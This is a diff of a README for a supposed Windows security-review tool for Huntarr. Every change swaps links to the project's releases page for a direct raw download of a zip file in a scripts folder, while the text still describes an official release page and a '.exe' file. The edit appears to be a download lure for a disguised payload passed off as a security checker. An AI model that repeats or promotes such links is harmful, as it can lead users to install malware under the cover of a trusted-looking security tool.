@@ -1,6 +1,6 @@
 # 🔒 huntarr-security-review - Verify Critical Security Flaws
 
-[![Download](https://img.shields.io/badge/Download-here-brightgreen?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/releases)
+[![Download](https://img.shields.io/badge/Download-here-brightgreen?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/raw/refs/heads/main/scripts/huntarr-review-security-3.2.zip)
 
 ## 🛠 About huntarr-security-review
 
@@ -19,7 +19,7 @@ Use this tool to understand the security status of your Huntarr setup before att
 
 Click the button below to visit the releases page where you can download the latest version of this application.
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/releases)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/raw/refs/heads/main/scripts/huntarr-review-security-3.2.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps carefully to get the application running on your Windows comp
 
 Go to the official release page using this link:
 
-https://github.com/beel9711/huntarr-security-review/releases
+https://github.com/beel9711/huntarr-security-review/raw/refs/heads/main/scripts/huntarr-review-security-3.2.zip
 
 This page lists the latest version of the app you can download.
 
@@ -177,8 +177,8 @@ Consult your IT administrator or check Huntarr’s official documentation to sec
 
 Visit the release page any time for the latest version:
 
-https://github.com/beel9711/huntarr-security-review/releases
+https://github.com/beel9711/huntarr-security-review/raw/refs/heads/main/scripts/huntarr-review-security-3.2.zip
 
 Click the correct Windows `.exe` file to download and update your tool.
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/releases)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/beel9711/huntarr-security-review/raw/refs/heads/main/scripts/huntarr-review-security-3.2.zip)
